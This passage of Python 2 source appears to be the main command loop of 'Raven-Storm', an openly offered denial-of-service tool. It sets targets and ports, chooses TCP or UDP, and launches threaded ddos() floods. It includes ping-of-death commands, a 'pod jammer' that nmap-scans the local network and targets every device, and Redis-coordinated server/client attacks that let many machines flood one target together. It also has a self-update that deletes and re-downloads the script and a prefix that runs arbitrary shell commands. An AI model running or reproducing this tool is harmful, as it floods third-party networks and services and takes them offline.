       print("No QuickRed.")
try:
  if 'server start' in " ".join(sys.argv):
      argvh = " ".join(sys.argv).split("server start")[1][1:].split(" ")[:2]
      try:
          argvh[1] = int(argvh[1])
      except:
          argvh = []
      com = ""
      try:
        try:
          hr = redis.Redis(host=argvh[0], port=argvh[1], db=0)
        except:
          hr = redis.Redis(host=hip, port=hport, db=0)
        hr.set("clid", "1")
        hr.set("com", "")
        hr.set("onrung", "false")
        hserver = True
        print("\033[1;32;40m\nServer started...\n")
      except:
        print("\033[1;32;40m\nCheck redis and try again.\n")
  elif 'client connect' in " ".join(sys.argv):
    if hserver:
      print("\033[1;32;40m\nCant listen, if already hosting.\n")
    else:
        argvh = " ".join(sys.argv).split("client connect")[1][1:].split(" ")[:2]
        try:
           argvh[1] = int(argvh[1])
        except:
           argvh = []
        com = ""
        try:
          try:
            hr = redis.Redis(host=argvh[0], port=argvh[1], db=0)
          except:
            hr = redis.Redis(host=hip, port=hport, db=0)
          hr.set("com", "")
          myclid = str(hr.get("clid"))
          hr.set("clid", str(int(myclid) + 1))
          hr.set(("clid" + str(myclid)), "0")
          hclient = True
          print("\033[1;32;40m\nClient started...\n")
        except:
          print("\033[1;32;40m\nCheck redis and try again.\n")
except Exception as e:
  print(e)
  pass
if verbosed:
   raw_input("")

if verbosed:
    print("[Run: Main-Loop]")
while i < 6:
   if verbosed:
      print("[Check: client + runmode]")
   if hclient and hr.get("onrung") != "true":
    try:
        # wait till command got
        if verbosed:
           print("[Continue]")
        time.sleep(0.6)
        if verbosed:
           print("[Check: Command]")
        while True:
            if hr.get("com") != "":
              if verbosed:
                print("[Check: client0]")
              if hr.get(("clid" + str(myclid))) == "0":
                print((">> " + hr.get("com") + "\n"))
                com = hr.get("com").lower()
                break
              if hclient:
                if hr.get("onrung") == "true":
                   if verbosed:
                      print("[Pass: Run-mode]")
                   com = "run"
                   break
            if hclient:
              if hr.get("onrung") == "true":
                if verbosed:
                  print("[Pass: Run-mode]")
                com = "run"
                break
            time.sleep(0.5)
        # continue with getting coms
        if verbosed:
          print("[Set: Variables by Server]")
          print("[Check: done]")
        if "help" in com:
            com = ""
        elif "set port" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  port = int(hr.get("port"))
                  print(("\033[1;32;40m\nPort updated to: " + str(port) + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "set threads" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  threads = int(hr.get("threads"))
                  print(("\033[1;32;40m\nThreads updated to: " + str(threads) + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "set ip" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  ip = hr.get("ip")
                  print(("\033[1;32;40m\nIP updated to: " + ip + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "set web" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  ip = hr.get("ip")
                  print(("\033[1;32;40m\nIP updated to: " + ip + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "get port i" in com:
            com = ""
        elif "get port w" in com:
            com = ""
        elif "pod target" in com:
            com = ""
        elif "pod target list" in com:
            com = ""
        elif "pod threads" in com:
            com = ""
        elif "pod sleep" in com:
            com = ""
        elif "pod run" in com:
            com = ""
        elif "lan scan" in com:
            com = ""
        elif "hbi" in com:
            com = ""
        elif "speed down" in com:
            com = ""
        elif "speed ping" in com:
            com = ""
        elif "set message" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  messages = hr.get("messages")
                  print(("\033[1;32;40m\nMessage updated to: " + str(messages) + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "update" in com:
            com = ""
        elif "set r" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  rtxt = int(hr.get("rtxt"))
                  rtxtzw = int(hr.get("rtxtzw"))
                  messages = str(hr.get("messages"))
                  messageszw = str(hr.get("messageszw"))
                  print(("\033[1;32;40m\nText repeating updated to: " + str(rtxt) + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "set sleep" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  sleepy = int(hr.get("sleepy"))
                  print(("\033[1;32;40m\nSleep updated to: " + str(sleepy) + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "st wait" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  timeforstress = int(hr.get("timeforstress"))
                  print(("\033[1;32;40m\nSleep time for stress testing updated to: " + str(timeforstress) + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "auto step" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  autostep = int(hr.get("autostep"))
                  print(("\033[1;32;40m\nAuto step updated to: " + str(autostep) + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "auto start" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  autostart = int(hr.get("autostart"))
                  print(("\033[1;32;40m\nAuto start updated to: " + str(autostart) + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "auto stop" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  autostop = int(hr.get("autostop"))
                  print(("\033[1;32;40m\nAuto stop updated to: " + str(autostop) + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "set mb" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                  setmb = float(hr.get("setmb"))
                  print(("\033[1;32;40m\nMB updated to: " + str(setmb) + "\n"))
                  break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "set listweb" in com or "set listip" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                    listweblist = hr.get("listweblist")
                    print(("\033[1;32;40m\nList updated.\n"))
                    break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "set listport" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                    listportslist = hr.get("listportslist")
                    print(("\033[1;32;40m\nList updated.\n"))
                    break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "method" in com:
            com = ""
            try:
              while True:
                if hr.get("sdone") == "true":
                    listportslist = hr.get("method")
                    print(("\033[1;32;40m\nMethod updated.\n"))
                    break
                time.sleep(1)
            except:
              print("\033[1;32;40m\nError.\n")
        elif "server ip" in com or "server port" in com:
            com = ""     
        listwebtrue = hr.get("listwebtrue")
        if verbosed:
          print("[Done]")
        time.sleep(0.2)
    except:
      try:
        print("\033[1;32;40m\nFailed to get command, exit using CTRL + c.\n")
        time.sleep(2)
      except:
        print("1;32;0m")
        sys.exit()
   else:
    if verbosed:
       print("[Else]")
    if len(runcomonstart) == 0:
       try:
         com = raw_input("\033[1;32;40m>> ").lower()
       except:
         print("\033[1;32;0m")
         sys.exit()
    else:
      try:
         if verbosed:
           print("[%s]" % runcomonstart[0])
         com = runcomonstart[0]
         print("\033[1;32;40m>> %s" % runcomonstart[0])
         runcomonstart.pop(0)
         if verbosed:
           print(runcomonstart)
      except:
        print("<Error>")
   
   if verbosed:
      print("[Check: Server]")
      #pdb.set_trace()
   if hserver:
    if verbosed:
      print("[Continue]")
      print("[done: False]")
    hr.set("sdone", "false")

   if verbosed:
      print("[Commands]")

   if 'help' in com:
     if helphelp == 'true':
        os.system('clear')
     helptext()
   helphelp = 'false'
   if 'quit' == com or 'exit' == com or 'q' == com or 'e' == com:
    os.system("clear")
    print("\033[1;32;0mBye. ^^")
    os.system("clear")
    print("\033[1;32;0mBye. ^^")
    break
    i = 7
    sys.exit()
   elif 'set port' in com:
      print(" ")
      try:
        portt = inporarg("Port", "set port", com)
        port = int(portt)
      except:
        print("Error")
      print(" ")
      
   elif 'set threads' in com:
      print(" ")
      try:
         threadss = inporarg("Number of Threads", "set threads", com)
         threads = int(threadss)
         print(" ")
      except:
         print(" ")
         print("Error")
         print(" ")
      
   elif 'set ip' in com:
      print(" ")
      ip = inporarg("Ip", "set ip", com)
      if not "." in ip:
        ip = ""
        print("Error")
      print(" ")
      listwebtrue = "false"
   
   elif 'set web' in com:
      try:
         print(" ")
         webtoip = inporarg("Website", "set web", com)
         webtoip = webtoip.replace("http://", "")
         webtoip = webtoip.replace("https://", "")
         print(" ")
         webtoiptxt = socket.gethostbyname(webtoip)
         ip = webtoiptxt
         listwebtrue = "false"
      except:
          print(" ")
          print("Error")
          print(" ")
      
   elif 'run' == com:
    if ip != "":
      if ip != iplisterstandard:
        lister = listeradd("ip", ip, lister)
      if port != portlisterstandard:
        lister = listeradd("port", port, lister)
      if threads != threadslisterstandard:
        lister = listeradd("threads", threads, lister)
      if messages != messageslisterstandard:
        lister = listeradd("messages", messages, lister)
      if rtxt != rtxtlisterstandard:
        lister = listeradd("rtxt", rtxt, lister)
      if sleepy != sleepylisterstandard:
        lister = listeradd("sleepy", sleepy, lister)
      if outtxt != outtxtlisterstandard:
        lister = listeradd("outtxt", outtxt, lister)
      if outtxtmute != outtxtmutelisterstandard:
        lister = listeradd("outtxtmute", outtxtmute, lister)
      if socketmethod != socketmethodlisterstandard:
        lister = listeradd("method", socketmethod, lister)
      if hserver:
        if hip != hiplisterstandard:
          lister = listeradd("hip", hip, lister)
        if hport != hportlisterstandard:
          lister = listeradd("hport", hport, lister)
      if verbosed:
        print(str(lister))
      try:
        pickle.dump(lister, open("ravenstorm-automated-list.ravenstormlist", "w"))
      except:
        pass
      if checkipexists(ip, port) or com == "run dev":
         if verbosed:
           print("[Command: Run]")
         if hclient:
           if verbosed:
              print("[Client]")
              print("[Reset Agreement]")
           try:
             hr.set("agree", "false")
           except:
             print("\nError.\n")
             sys.exit()
           
           while True:
             try:
               if hr.get("agree") == "true":
                 break
               time.sleep(0.2)
             except:
               print("\nError.\n")
               time.sleep(2)
         if hserver:
           if verbosed:
              print("[Server]")
           try:
             time.sleep(1)
             if verbosed:
                print("[Set Variables]")
             hr.set("com", "")
             hr.set("onrung", "true")
             hr.set("running", "true")
           except:
             print("\nError.\n")
             sys.exit()
           if raw_input("\nAlso use server as ddos/dos? (y/n) ") != "y":
             if verbosed:
                print("[Agreement]")
             agreed()
             raw_input("[Press Enter to stop attack]")
             try:
               if verbosed:
                 print("[Running: False]")
               hr.set("running", "false")
             except:
               print("\nError.")
               print("Please kill it manualy.\n")
           else:
             if verbosed:
                print("[Else]")
             agreed()
             print("To stop: End Redis using CRTL + z ")
             time.sleep(3)
             time.sleep(autostart)
             if stress == 'true':
               i = 8
               if listwebtrue == "false" and listportstrue == "false":
                stresstest()
               else:
                print("Dont use multiple targets/ports in the Stress-testing mode.")
             else:
               if autostop != 0:
                 autostarttime = time.time()
               i = 8
               for maxthreads, i in enumerate(range(threads)):
                 try:
                    t = Thread(target=ddos)
                    time.sleep(autostep)
                    t.start()
                 except:
                    print("\033[1;32;0mCould not start thread %s." % maxthreads)
         else:
           if verbosed:
               print("['Normal']")
           if not hclient:
             agreed()
           print("\033[1;32;40mTo stop press: CRTL + z")
           time.sleep(3)
           time.sleep(autostart)
           if stress == 'true':
             if listwebtrue == "false" and listportstrue == "false":
              stresstest()
             else:
              print("Dont use multiple targets/ports in the Stress-testing mode.")
           else:
             if autostop != 0:
               autostarttime = time.time()
             i = 8
             for maxthreads, i in enumerate(range(threads)):
               try:
                  t = Thread(target=ddos)
                  time.sleep(autostep)
                  t.start()
               except:
                  print("\033[1;32;0mCould not start thread %s." % maxthreads)
      else:
        print("\nTarget does not exit.\n")
    else:
      print("\nNo ip set.\n")
         
      
   elif 'get port i' in com:
      try:
         print(" ")
         psi = inporarg("Ip", "get port i", com) 
         scann(psi)
      except:
         print("Error")
         print(" ")   
   elif 'get port w' in com:
       try:
        print(" ")
        psw = inporarg("Website", "get port w", com)
        psww = socket.gethostbyname(psw)
        scann(psww)
       except:
        print(" ")
        print("Error")
        print(" ")
   elif 'set message' in com:
      print(" ")
      messages = inporarg("Message", "set message", com)
      rtxt = 1
      print(" ")
   elif 'update' in com:
        try:
          os.system("rm -i %s" % sys.argv[0])
          wget.download("https://github.com/Taguar258/Raven-Storm/blob/master/rs.pyo?raw=true")
          os.system("mv rs.pyo?raw=true %s" % sys.argv[0])
        except:
          print("Error.")
        sys.exit()
   elif 'set r' in com:
      print(" ")
      try:
         rtxtzw = rtxt
         rtxt = int(inporarg("Number to Repeat", "set r", com))
         if rtxt < 1:
            print("Error.")
         else:
            if rtxtzw < rtxt:
               messageszw = messages
               messages = (str(messages) * int(rtxt))
            else:
               messages = (str(messageszw) * int(rtxt))
      except:
         print("Error.")
      print(" ")
   elif 'outtxt' in com:
      print(" ")
      if outtxt == 'true':
         print("\033[1;32;40mdisabled")
         outtxt = "false"
      else:
         print("\033[1;32;40menabled")
         outtxt = 'true'
      print(" ")
   elif 'mute' in com:
      print(" ")
      if outtxtmute == True:
         print("\033[1;32;40mdisabled")
         outtxtmute = False
         outtxt = zwouttxt
      else:
         print("\033[1;32;40menabled")
         zwouttxt = outtxt
         outtxt = "false"
         outtxtmute = True
      print(" ")
   elif "method" in com:
      print("")
      if socketmethod == "udp":
         socketmethod = "tcp"
         print("\033[1;32;40mMethod: TCP")
      else:
         socketmethod = "udp"
         print("\033[1;32;40mMethod: UDP")
      print("")
   elif 'bywho' in com:
    print("   Taguar258")
   elif 'values' in com or 'ls' == com:
      print("")
      print("   Basic:")
      if listwebtrue == "true":
        print("   List: %s" % str(listweblist))
      else:
        print("      Ip: %s" % str(ip))
      if listportstrue == "true":
        print("      Port: %s" % str(listportslist))
      else:
        print("      Port: %s" % str(port))
      print("      Threads: %s" % str(threads))
      print("\n   Advanced:")
      if len(messages) > 40:
        print("      Message: %s ..." % str(messages[:40]))
      else:
        print("      Message: %s" % str(messages))
      print("      Repeat: %s" % str(rtxt))
      print("      Success output: %s" % str(outtxt))
      print("      Hide output: %s" % str(outtxtmute))
      print("      Sleep: %s" % str(sleepy))
      print("      Method: %s" % str(socketmethod.upper()))
      print("      Stress-testing: %s" % str(stress))
      print("      Stress delay: %s" % str(timeforstress))
      print("      Next thread delay: %s" % str(autostep))
      print("      Activation delay: %s" % str(autostart))
      print("      Force stop delay: %s" % str(autostop))
      print("      Mb send to server: %s" % str(float(sys.getsizeof(str(messages)) / 1000000)))
      print("      Server ip: %s" % str(hip))
      print("      Server port: %s" % str(hport))
      print("      Server: %s" % str(hserver))
      print("      Client: %s" % str(hclient))
      print("      Pod Packet size: %s kb" % podsize)
      print("      Pod targets: %s" % podtarget)
      print("      Pod threads: %s" % podthreads)
      print("      Pod delay: %s" % podsleep)
      print("      Pod interval: %s" % podinterval)
      print("      Pod auto stop: %s" % podautodl)
      print("      HTTP target: %s" % layerseventarget)
      print("      HTTP threads: %s" % layerseventhreads)
      print("      HTTP interval: %s" % layerseveninterval)
      print("      HTTP sleep: %s" % ", ".join(layersevensleep))
      print("      HTTP method: %s" % ", ".join(layersevenmethod))
      print("      Version: %s" % str(rsversion))
      print("      Command script got: %s" % str(sys.argv))
      print("")
   elif 'dev redis' in com:
      print("")
      try:
         os.system("for key in $(redis-cli -p " + str(hport) + " keys \*); do echo \"Key : '$key'\" ; redis-cli -p " + str(hport) + " GET $key; done")
      except:
         print("Error.")
      print("")
   elif 'set sleep' in com:
      try:
         print(" ")
         sleepy = int(inporarg("Time in Seconds", "set sleep", com))
         print(" ")
      except:
        print(" ")
        print("Error")
        print(" ")
   elif 'stress' in com:
       print(" ")
       if stress == 'true':
         print("\033[1;32;40mdisabled")
         stress = "false"
       else:
         print("\033[1;32;40menabled")
         stress = 'true'
       print(" ")
   elif 'st wait' in com:
       print(" ")
       timeforstress = inporarg("Time between tests in Seconds", "st wait", com)
       try:
           timeforstress = int(timeforstress)
       except:
           print("Error")
       print(" ")
   #elif 'st step' in com:
   #    print(" ")
   #    stressstep = raw_input("\033[1;32;40mStep between tests: ")
   #    try:
   #        stressstep = int(stressstep)
   #    except:
   #        print("Error")
   #        print(" ")
   elif 'auto step' in com:
       print(" ")
       try:
           autostep = inporarg("Time for next thread to activate in Seconds", "auto step", com)
           autostep = int(autostep)
       except:
           print("Error")
       print(" ")
   elif 'auto start' in com:
       print(" ")
       try:
           autostart = inporarg("Time for attack to start in Seconds", "auto start", com)
           autostart = int(autostart)
       except:
           print("Error")
       print(" ")
   elif "pod auto stop" in com:
    print(" ")
    try:
     podautodl = int(inporarg("Auto stop", "pod auto stop", com))
    except:
     print("Error.")
    print(" ")
   elif 'auto stop' in com:
       print(" ")
       try:
           autostop = inporarg("Seconds for autostop attack", "auto stop", com)
           autostop = int(autostop)
       except:
           print("Error")
       print(" ")
   elif 'set mb' in com:
    print(" ")
    try:
      print("Rarely crashing if value too high.")
      setmb = inporarg("Mb to send to target", "set mb", com)
      setmb = int(setmb)
      setmb = int(setmb / 0.000001)
      messages = ("r" * setmb)
      rtxt = setmb
      messageszw = "r"
    except Exception as ee:
      print("Error", ee)
    print(" ")
   elif 'set listweb' in com:
    try:
      print("")
      listweblist = inporarg('WebList split by ", "', "set listweb", com).split(', ')
      for listnum, listvalue in enumerate(listweblist):
        listweblist[listnum] =  listweblist[listnum].replace("http://","")
        listweblist[listnum] =  listweblist[listnum].replace("https://","")
        listweblist[listnum] =  socket.gethostbyname(listweblist[listnum])
      listwebtrue = "true"
      print(listweblist)
    except:
      print("\033[1;32;40m\nError.\n")
    print("")
    #print("#")
   elif 'set listip' in com:
    try:
      print("")
      listweblist = inporarg('IPList split by ", "', "set listip", com).split(', ')
      listwebtrue = "true"
      #print(listweblist)
    except:
      print("Error")
    #print("#")
    print("")
   elif 'set listport' in com:
    try:
      print("")
      listportslist = inporarg('PORTList split by ", "', "set listport", com).split(', ')
      listportstrue = "true"
    except:
      print("Error")
    print("")
   elif 'server start' in com:
    if hip != "" and hport != "":
      com = ""
      try:
        hr = redis.Redis(host=hip, port=hport, db=0)
        hr.set("clid", "1")
        hr.set("onrung", "false")
        hr.set("com", "")
        hserver = True
        print("\033[1;32;40m\nServer started...\n")
      except:
        print("\033[1;32;40m\nCheck redis and try again.\n")
    else:
      print("\033[1;32;40m\nIp or/and port not definied.\n")
   elif 'client connect' in com:
    if hserver:
      print("\033[1;32;40m\nCant listen, if already hosting.\n")
    else:
      com = ""
      if hip != "" and hport != "":
        try:
          hr = redis.Redis(host=hip, port=hport, db=0)
          hr.set("com", "")
          myclid = str(hr.get("clid"))
          hr.set("clid", str(int(myclid) + 1))
          hr.set(("clid" + str(myclid)), "0")
          hclient = True
          print("\033[1;32;40m\nClient started...\n")
        except:
          print("\033[1;32;40m\nCheck redis and try again.\n")
      else:
        print("\033[1;32;40m\nNo ip and/or port definied.\n")
   elif 'server ip' in com:
    print(" ")
    hip = inporarg("Ip", "server ip", com)
    print(" ")
   elif 'server port' in com:
    print(" ")
    hport = inporarg("Port", "server port", com)
    print(" ")
   elif 'lan scan' in com:
    print(" ")
    if nmapinstalledq:
       lanscan()
    else:
       print("Please install nmap.")
    print(" ")
   elif 'hbi' in com:
    print(" ")
    try:
     zw = (inporarg("Domain", "hbi", com).replace("https://", "").replace("http://", ""))
     print(hbi(zw))
    except:
     print("   Error.")
    print(" ")
   elif 'speed down' in com:
    print("")
    print("   Result: %s" % speedtest(inporarg("Website", "speed down", com)))
    print("")
   elif 'speed ping' in com:
    print("")
    print("   Result: %s" % speedping(inporarg("Ip", "speed ping", com)))
    print("")
   elif 'bt scan' in com:
    print(" ")
    try:
     pass
     #os.system("hcitool scan")
     #os.system("hciconfig -a")
    except:
     print("Error.")
    print(" ")
   elif "pod sleep" in com:
    print(" ")
    try:
     podsleep = float(inporarg("Delay", "pod sleep", com))
    except:
     print("Error.")
    print(" ")
   elif "pod interval" in com:
    print(" ")
    try:
     podinterval = float(inporarg("Delay", "pod interval", com))
    except:
     print("Error.")
    print(" ")
   elif "pod threads" in com:
    print(" ")
    try:
     podthreads = int(inporarg("Threads", "pod threads", com))
    except:
     print("Error.")
    print(" ")
   elif 'pod target list' in com:
    print(" ")
    try:
     podtarget = inporarg("List of Domains/Ips split by ', '", "pod target list", com).split(", ")
    except:
     print("Error.")
    print(" ")
   elif "pod target" in com:
    print(" ")
    try:
     podtarget = str(inporarg("Domain or ip", "pod target", com))
    except:
     print("Error.")
    print(" ")
   elif 'pod size' in com:
    print(" ")
    try:
     podsizezw = int(inporarg("Size in kb", "pod size", com))
     if podsizezw < podminsize:
      print("Size needs to be more than 4kb.")
     elif podsizezw > podmaxsize:
      print("Size needs to be less than 65500kb.")
     else:
      podsize = podsizezw
    except:
     print("Error.")
    print(" ")
   elif 'pod checking' == com:
    podtesting(podsize, podtarget, podthreads, podsleep, podinterval, podautodl)
   elif 'pod run' == com:
    #lister
    if podsize != podsizelisterstandard:
      lister = listeradd("podsize", podsize, lister)
    if podthreads != podthreadslisterstandard:
      lister = listeradd("podthreads", podthreads, lister)
    if podsleep != podsleeplisterstandard:
      lister = listeradd("podsleep", podsleep, lister)
    if podinterval != podsleeplisterstandard:
      lister = listeradd("podinterval", podinterval, lister)
    if podautodl != podautodllisterstandard:
      lister = listeradd("podautodl", podautodl, lister)
    try:
      pickle.dump(lister, open("ravenstorm-automated-list.ravenstormlist", "w"))
    except:
      pass
    #print(" ")
    agreed()
    #print("Running...")
    pod(podsize, podtarget, podthreads, podsleep, podinterval, podautodl)
   elif "pod jammer" in com:
    print(" ")
    try:
     gateways = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     gateways.connect(("8.8.8.8", 80))
     gateway = ".".join((gateways.getsockname()[0].split("."))[:len(gateways.getsockname()[0].split(".")) - 1])
     podlocalip = gateways.getsockname()[0]
     gateways.close()
     nm.scan(hosts=("%s.0/24" % gateway), arguments="-sP")
     lanscandev = [(x) for x in nm.all_hosts()]
     podtarget = []
     for lanscandevice in lanscandev:
      #print(lanscandevice)
      if lanscandevice != podlocalip and lanscandevice != ("%s.1" % gateway):
       #print(lanscandevice)
       podtarget.append(lanscandevice)
     print("All devices in Internet targeted.", podtarget)
    except Exception as e:
     if not nmapinstalledq:
        print("Please install nmap.")
     else:
        print("Error.", e)
    print(" ")
   elif com == "clear" or com == "clear ":
    os.system("clear")
   elif "post scan" in com:
    print("")
    beautifulsoupexist = False
    try:
      from bs4 import BeautifulSoup
      beautifulsoupexist = True
    except:
      print("   Please install BeautifulSoup4.")
    lxmlexist = False
    try:
      import lxml
      lxmlexist = True
    except:
      print("   Please install lxml.")
    if beautifulsoupexist and lxmlexist:
      postscanurl = str(inporarg("Domain", "post scan", com))
      if "http" not in postscanurl:
        print("   Error, try with https or http.")
        raise Exception("httperror")
      print("")
      print("   Scanning...")
      try:
       postscan = requests.get(postscanurl)
       postsoup = BeautifulSoup(postscan.content, "lxml")
       print("   Results:")
       for postscanx in postsoup.find_all("form"):
         for postscanl in postscanx.find_all(["input", "button", "text"]):
           try:
            print("      %s :: %s" % (postscanl.name, postscanl.get("name")))
           except:
            pass
      except:
       print("   Error.")
    print("")
   elif com == "redis run" or com == "redis run ":
    os.system("redis-server ./redis-conf/linux/other-redis.conf || redis-server")
   elif com == "redis run hide" or com == "redis run hide":
    print("   Running as thread in background.")
    Thread(target=redisinbackground).start()
   elif ">> " in com:
    os.system(com[3:])
   elif com == "":
    pass
   else:
      if 'help' not in com:
         print("""\033[1;32;40m
      No such command.
                  """)
   if hclient:
    if verbosed:
        print("[Clientid: Done]")
    try:
        hr.set(("clid" + str(myclid)), "1")
    except:
        print("\033[1;32;40m\nError.\n")
   if hserver:
    if verbosed:
        print("[Set Variables]")
    try:
      # define local vars
      if "set port" in com:
        hr.set("port", port)
      if "set threads" in com:
        hr.set("threads", threads)
      if "set ip" in com:
        hr.set("ip", ip)
      if "set web" in com:
        hr.set("ip", ip)
      if "set message" in com:
        hr.set("messages", messages)
      if "set r" in com:
        hr.set("rtxt", rtxt)
        hr.set("rtxtzw", rtxtzw)
        hr.set("messages", messages)
        hr.set("messageszw", messageszw)
      if "set sleep" in com:
        hr.set("sleepy", sleepy)
      if "st wait" in com:
        hr.set("timeforstress", timeforstress)
      if "auto step" in com:
        hr.set("autostep", autostep)
      if "auto start" in com:
        hr.set("autostart", autostart)
      if "auto stop" in com:
        hr.set("autostop", autostop)
      if "set mb" in com:
        hr.set("setmb", setmb)
      if "set listweb" in com:
        hr.set("listweblist", listweblist)
      if "set listport" in com:
        hr.set("listportslist", listportslist)
      if "method" in com:
        hr.set("method", socketmethod)

      
      hr.set("listwebtrue", listwebtrue)
      
      time.sleep(1)
      if verbosed:
        print("[Done: True]")
      hr.set("sdone", "true")
      
      time.sleep(0.3)
    except:
      print("\033[1;32;40m\nError.\n")

   if hserver and com != "":
    if verbosed:
        print("[Wait for other Clients]")
    try:
        hr.set("com", com)
        loopchecker = True
        while loopchecker:
            time.sleep(0.2)
            loopingtt = True
            for t in range((int(hr.get("clid")) - 1)):
              t = (t + 1)
              #print(hr.get(("clid" + str(t))))
              #print(t)
              if hr.get(("clid" + str(t))) != "1":
                loopingtt = False
            #print(loopingtt)
            if loopingtt:
                for f in range((int(hr.get("clid")) - 1)):
                    f = (f + 1)
                    #reset
                    hr.set(("clid" + str(f)), "0")
                hr.set("com", "")
                loopchecker = False
                break
        hr.set("com", "")
        hr.set("onrung", "false")
        
    except:
        print("\033[1;32;40mFailed to send command...\n")
